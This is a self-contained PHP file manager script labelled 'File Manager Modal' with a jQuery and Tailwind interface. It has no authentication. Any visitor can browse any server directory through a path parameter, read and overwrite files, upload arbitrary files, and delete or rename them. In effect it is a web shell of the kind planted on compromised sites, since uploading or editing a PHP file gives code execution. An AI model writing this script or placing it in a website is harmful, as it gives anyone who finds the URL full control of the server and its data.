<?php
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();
$parent = dirname($path);

// Handle POST actions
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['new_folder'])) {
        mkdir($path . DIRECTORY_SEPARATOR . basename($_POST['new_folder']));
    } elseif (isset($_POST['new_file'])) {
        file_put_contents($path . DIRECTORY_SEPARATOR . basename($_POST['new_file']), '');
    } elseif (isset($_POST['delete'])) {
        $target = $path . DIRECTORY_SEPARATOR . basename($_POST['delete']);
        if (is_dir($target)) rmdir($target); else unlink($target);
    } elseif (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
        $from = $path . DIRECTORY_SEPARATOR . basename($_POST['rename_from']);
        $to = $path . DIRECTORY_SEPARATOR . basename($_POST['rename_to']);
        rename($from, $to);
    } elseif (isset($_POST['edit_file']) && isset($_POST['content'])) {
        file_put_contents($path . DIRECTORY_SEPARATOR . basename($_POST['edit_file']), $_POST['content']);
    } elseif (isset($_FILES['files'])) {
        foreach ($_FILES['files']['tmp_name'] as $i => $tmp) {
            move_uploaded_file($tmp, $path . DIRECTORY_SEPARATOR . basename($_FILES['files']['name'][$i]));
        }
    } elseif (isset($_POST['get_content'])) {
        $file = $path . DIRECTORY_SEPARATOR . basename($_POST['get_content']);
        if (is_file($file)) echo htmlspecialchars(file_get_contents($file));
        exit;
    }
}
$files = scandir($path);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>File Manager Modal</title>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
<script>
$(function(){
    // Edit modal
    $('.edit-btn').click(function(){
        let f = $(this).data('file');
        $.post('', {get_content: f}, function(data){
            $('#editModal textarea').val(data);
            $('#editModal input[name="edit_file"]').val(f);
            $('#editModal').removeClass('hidden');
        });
    });
    // Delete modal
    $('.delete-btn').click(function(){
        $('#deleteModal input[name="delete"]').val($(this).data('file'));
        $('#deleteModal span').text($(this).data('file'));
        $('#deleteModal').removeClass('hidden');
    });
    // Rename modal
    $('.rename-btn').click(function(){
        $('#renameModal input[name="rename_from"]').val($(this).data('file'));
        $('#renameModal input[name="rename_to"]').val($(this).data('file'));
        $('#renameModal').removeClass('hidden');
    });
    // New file/folder modal
    $('#showNewFile').click(()=>$('#newFileModal').removeClass('hidden'));
    $('#showNewFolder').click(()=>$('#newFolderModal').removeClass('hidden'));
    // Close modals
    $('.close').click(()=>$('.modal').addClass('hidden'));
});
</script>
</head>
<body class="bg-gray-100 p-4">
<h1 class="text-2xl font-bold mb-4">📂 <?= htmlspecialchars($path) ?></h1>

<div class="mb-4 space-x-2">
<?php if($path != $parent): ?>
<a href="?path=<?= urlencode($parent) ?>" class="bg-gray-300 px-2 py-1 rounded">⬅️ Up</a>
<?php endif; ?>
<button id="showNewFile" class="bg-green-500 text-white px-2 py-1 rounded">📄 New File</button>
<button id="showNewFolder" class="bg-green-500 text-white px-2 py-1 rounded">📁 New Folder</button>
</div>

<table class="min-w-full bg-white border">
<tr class="bg-gray-200"><th class="p-2 text-left">Name</th><th class="p-2">Type</th><th class="p-2">Action</th></tr>
<?php foreach($files as $f): if($f=='.'||$f=='..')continue;
$fp=$path.DIRECTORY_SEPARATOR.$f; ?>
<tr class="border-t">
<td class="p-2">
<?php if(is_dir($fp)): ?>
<a href="?path=<?=urlencode($fp)?>" class="text-blue-500 underline">📁 <?=htmlspecialchars($f)?></a>
<?php else: ?>
📄 <?=htmlspecialchars($f)?>
<?php endif;?>
</td>
<td class="p-2"><?=is_dir($fp)?'Folder':'File'?></td>
<td class="p-2 space-x-1">
<?php if(!is_dir($fp)): ?>
<button data-file="<?=htmlspecialchars($f)?>" class="edit-btn bg-yellow-300 px-2 rounded">✏️ Edit</button>
<?php endif;?>
<button data-file="<?=htmlspecialchars($f)?>" class="rename-btn bg-green-300 px-2 rounded">✏️ Rename</button>
<button data-file="<?=htmlspecialchars($f)?>" class="delete-btn bg-red-400 px-2 rounded">🗑️ Delete</button>
</td>
</tr>
<?php endforeach;?>
</table>

<div class="mt-4">
<form method="post" enctype="multipart/form-data">
<input type="file" name="files[]" multiple class="border px-2">
<button class="bg-blue-500 text-white px-2 rounded">⬆️ Upload</button>
</form>
</div>

<!-- Modals -->
<div id="editModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 w-1/2 rounded">
<form method="post">
<input type="hidden" name="edit_file">
<textarea name="content" class="w-full h-64 border mb-2"></textarea>
<div class="flex justify-between">
<button class="bg-green-500 text-white px-4 py-1 rounded">💾 Save</button>
<button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Close</button>
</div>
</form>
</div></div>

<div id="deleteModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded">
<form method="post">
<p>Are you sure to delete: <span class="font-bold"></span> ?</p>
<input type="hidden" name="delete">
<div class="flex justify-between mt-2">
<button class="bg-red-500 text-white px-4 py-1 rounded">🗑️ Delete</button>
<button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button>
</div>
</form>
</div></div>

<div id="renameModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded">
<form method="post">
<input type="hidden" name="rename_from">
<p>New name:</p>
<input name="rename_to" class="border px-2 mb-2">
<div class="flex justify-between">
<button class="bg-green-500 text-white px-4 py-1 rounded">↩️ Rename</button>
<button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button>
</div>
</form>
</div></div>

<div id="newFileModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded">
<form method="post">
<p>File name:</p>
<input name="new_file" class="border px-2 mb-2">
<div class="flex justify-between">
<button class="bg-green-500 text-white px-4 py-1 rounded">📄 Create</button>
<button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button>
</div>
</form>
</div></div>

<div id="newFolderModal" class="modal fixed inset-0 bg-gray-800 bg-opacity-75 hidden flex items-center justify-center">
<div class="bg-white p-4 rounded">
<form method="post">
<p>Folder name:</p>
<input name="new_folder" class="border px-2 mb-2">
<div class="flex justify-between">
<button class="bg-green-500 text-white px-4 py-1 rounded">📁 Create</button>
<button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Cancel</button>
</div>
</form>
</div></div>
</body>
</html>
